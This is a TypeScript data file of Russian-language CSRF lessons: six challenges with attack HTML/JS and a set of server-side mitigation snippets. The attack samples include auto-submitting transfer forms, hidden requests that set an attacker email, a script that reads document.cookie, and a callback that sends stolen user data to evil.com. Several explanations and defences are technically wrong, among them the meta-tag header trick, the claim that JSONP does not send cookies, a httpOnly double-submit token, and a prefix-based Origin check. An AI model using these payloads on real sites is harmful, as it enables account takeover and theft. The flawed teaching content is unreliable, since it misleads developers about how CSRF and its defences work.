// CSRF (Cross-Site Request Forgery) Educational Content

export interface CSRFChallenge {
  id: string;
  level: string;
  title: string;
  description: string;
  vulnerableScenario: string;
  attackCode: string;
  mitigation: string;
  explanation: string;
}

export const csrfChallenges: CSRFChallenge[] = [
  {
    id: 'csrf-1',
    level: 'Новичок',
    title: 'Перевод денег без согласия',
    description: 'Злоумышленник создаёт страницу, которая незаметно для жертвы переводит деньги на его счёт.',
    vulnerableScenario:
      'Веб-банк использует куки для аутентификации. Функция перевода денег accessible через POST-запрос к /api/transfer. Нет проверки CSRF-токена.',
    attackCode: `<!-- Злоумышленник размещает это на своём сайте -->
<!DOCTYPE html>
<html>
<body onload="document.getElementById('csrf-form').submit()">
  <form id="csrf-form" action="https://bank.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="currency" value="RUB">
  </form>
  <p>Загрузка...</p>
</body>
</html>`,
    explanation:
      'Когда жертва (зарегистрированная в bank.com) открывает страницу атакующего, форма автоматически отправляется. Браузер автоматически добавляет куки аутентификации, и сервер считает запрос легитимным. Перевод на 10000₽ выполняется без ведома пользователя.',
    mitigation: 'Используйте CSRF-токены: генерируйте уникальный токен для каждой сессии и проверяйте его на сервере.',
  },
  {
    id: 'csrf-2',
    level: 'Новичок',
    title: 'Изменение email аккаунта',
    description: 'Атакующий меняет email жертвы, чтобы получить доступ к сбросу пароля.',
    vulnerableScenario:
      'Приложение позволяет изменить email через GET-запрос: /api/update-email?email=new@email.com. Это опасная практика — изменения состояния не должны выполняться через GET.',
    attackCode: `<!-- Невидимый IMG-тег вызывает изменение email -->
<img src="https://app.com/api/update-email?email=attacker@evil.com" 
     style="display:none"
     onerror="alert('Email изменён!')">

<!-- Или через GET-запрос в iframe -->
<iframe src="https://app.com/api/update-email?email=attacker@evil.com" 
        style="display:none"></iframe>`,
    explanation:
      'GET-запросы не должны изменять данные! Браузер автоматически отправляет куки при загрузке изображения или iframe. Атакующий может просто отправить ссылку жертве, и при клике email будет изменён.',
    mitigation: 'Никогда не используйте GET для операций изменения данных. Всегда используйте POST/PUT/DELETE с CSRF-защитой.',
  },
  {
    id: 'csrf-3',
    level: 'Средний',
    title: 'Подделка POST-запроса с картинкой',
    description: 'Использование наведённого изображения для выполнения POST-запроса через fetch.',
    vulnerableScenario:
      'API принимает JSON-данные в POST-запросе. Атакующий использует технику Image API для обхода CORS и выполнения запроса.',
    attackCode: `<!-- Злоумышленник использует canvas для создания POST-запроса -->
<script>
  // Создаём изображение с данными в URL
  const img = new Image();
  img.src = 'https://api.com/upload?data=' + encodeURIComponent(JSON.stringify({
    malicious: 'payload',
    steal: document.cookie
  }));
  document.body.appendChild(img);
</script>

<!-- Или через form с target в iframe -->
<form action="https://api.com/transfer" method="POST" target="hidden-frame">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<iframe name="hidden-frame" style="display:none"></iframe>
<script>
  document.forms[0].submit();
</script>`,
    explanation:
      'Форма с target в скрытом iframe позволяет выполнить POST-запрос без перенаправления пользователя. Куки автоматически добавляются браузером. Это классический CSRF-атак.',
    mitigation: 'Проверяйте заголовок Origin и Referer. Используйте SameSite куки (Strict или Lax).',
  },
  {
    id: 'csrf-4',
    level: 'Средний',
    title: 'Двойная подмена токена',
    description: 'Атака на реализацию CSRF-защиты с некорректной проверкой токена.',
    vulnerableScenario:
      'Приложение использует CSRF-токен, но проверяет только наличие заголовка X-CSRF-Token, который можно подделать с помощью CORS-ошибки.',
    attackCode: `<!-- Атакующий знает что токен передаётся в заголовке -->
<!-- Используем мета-тег для установки заголовка (работает в некоторых браузерах) -->
<meta http-equiv="X-CSRF-Token" content="attacker-fake-token">

<script>
  // Пытаемся отправить запрос с поддельным токеном
  fetch('https://vulnerable.com/api/delete-account', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ confirm: true })
  });
</script>

<!-- Если сервер не проверяет CSRF-токен корректно, аккаунт будет удалён -->`,
    explanation:
      'Некоторые реализации CSRF-защиты проверяют только наличие заголовка, но не валидируют его значение. Если токен хранится в cookie и сервер пытается прочитать его через JavaScript, возможна атака через CORS.',
    mitigation: 'Всегда используйте Double Submit Cookie паттерн или Synchronizer Token Pattern с серверной проверкой.',
  },
  {
    id: 'csrf-5',
    level: 'Продвинутый',
    title: 'Обход SameSite с помощью Redirect',
    description: 'Использование open redirect для обхода SameSite Lax политики.',
    vulnerableScenario:
      'Сайт имеет уязвимость open redirect: /redirect?url=... . SameSite=Lax куки не отправляются к чужим доменам, но можно использовать редирект на свой же домен.',
    attackCode: `<!-- Шаг 1: Перенаправляем на уязвимый сайт -->
<a href="https://vulnerable.com/redirect?url=https://vulnerable.com/login?redirect=/dashboard">
  Войти в банк
</a>

<!-- Шаг 2: После входа куки устанавливаются с SameSite=Lax -->

<!-- Шаг 3: Атакующий использует iframe для CSRF-атаки -->
<iframe src="https://vulnerable.com/redirect?url=https://vulnerable.com/api/transfer?to=attacker&amount=1000"></iframe>

<!-- SameSite=Lax позволяет отправлять куки при top-level навигации, 
     но iframe может обойти это через редирект -->`,
    explanation:
      'SameSite=Lax блокирует куки при кросс-доменных запросах, но разрешает их при top-level навигации. Используя open redirect, можно создать цепочку запросов, которая обходит эту защиту.',
    mitigation: 'Используйте SameSite=Strict для чувствительных операций. Отключите open redirect или тщательно валидируйте URL.',
  },
  {
    id: 'csrf-6',
    level: 'Эксперт',
    title: 'CSRF через JSONP',
    description: 'Использование устаревшего JSONP для извлечения данных и выполнения CSRF.',
    vulnerableScenario:
      'API поддерживает JSONP для обратной совместимости: /api/user?callback=handleData. JSONP не использует куки автоматически, но уязвим для CSRF через GET-запросы.',
    attackCode: `<!-- Атакующий создаёт скрипт для извлечения данных -->
<script>
  function handleData(user) {
    // Отправляем украденные данные на сервер атакующего
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(user),
      headers: { 'Content-Type': 'application/json' }
    });
  }
</script>
<script src="https://vulnerable.com/api/user?callback=handleData"></script>

<!-- Или для выполнения действия -->
<script src="https://vulnerable.com/api/delete-account?callback=undefined"></script>`,
    explanation:
      'JSONP — устаревшая технология, позволяющая выполнять JavaScript с другого домена. Если API поддерживает JSONP и не требует аутентификации через заголовки, атакующий может извлечь данные или выполнить действия через GET-запросы.',
    mitigation: 'Отключите JSONP. Используйте CORS с правильными заголовками. Требуйте CSRF-токены для всех операций.',
  },
];

// CSRF Mitigation Strategies
export const csrfMitigations = [
  {
    technique: 'CSRF Token (Synchronizer Token)',
    description: 'Генерируйте уникальный криптографически стойкий токен для каждой сессии. Вставляйте его в каждую форму и проверяйте на сервере.',
    implementation: `// Server-side (Node.js/Express)
const csrfToken = crypto.randomBytes(32).toString('hex');
res.cookie('csrf_token', csrfToken);

// In template
<form>
  <input type="hidden" name="csrf_token" value="${"{{ csrfToken }}"}">
</form>

// Server validation
app.post('/transfer', (req, res) => {
  const token = req.body.csrf_token;
  if (token !== req.cookies.csrf_token) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Proceed with transfer
});`,
  },
  {
    technique: 'Double Submit Cookie',
    description: 'Отправляйте токен как в cookie, так и в заголовке/параметре. Сервер сравнивает оба значения.',
    implementation: `// Set cookie
res.cookie('csrf_token', token, { httpOnly: true });

// Client sends in header
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': token },
  body: JSON.stringify(data)
});

// Server validates
if (req.headers['x-csrf-token'] !== req.cookies.csrf_token) {
  return res.status(403).send('CSRF validation failed');
}`,
  },
  {
    technique: 'SameSite Cookie Attribute',
    description: 'Устанавливайте SameSite=Strict или SameSite=Lax для куки аутентификации.',
    implementation: `// Set SameSite cookie
res.cookie('session', sessionId, {
  sameSite: 'strict',  // или 'lax'
  secure: true,        // только HTTPS
  httpOnly: true,      // недоступно для JS
  maxAge: 24 * 60 * 60 * 1000  // 24 часа
});

// In production
session({
  cookie: { sameSite: 'strict' }
});`,
  },
  {
    technique: 'Origin/Header Validation',
    description: 'Проверяйте заголовки Origin или Referer на соответствие ожидаемому домену.',
    implementation: `// Middleware для проверки Origin
function checkOrigin(req, res, next) {
  const origin = req.headers.origin;
  const allowedOrigin = 'https://yourapp.com';
  
  if (!origin || !origin.startsWith(allowedOrigin)) {
    return res.status(403).send('Forbidden');
  }
  next();
}

app.post('/api/*', checkOrigin, (req, res) => {
  // Process request
});`,
  },
  {
    technique: 'Custom Request Headers',
    description: 'Требуйте наличие кастомного заголовка, который не может быть установлен через стандартные формы.',
    implementation: `// Client
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
});

// Server
app.post('/api/*', (req, res) => {
  const requestedWith = req.headers['x-requested-with'];
  if (requestedWith !== 'XMLHttpRequest') {
    return res.status(403).send('Invalid request');
  }
  // Process
});`,
  },
];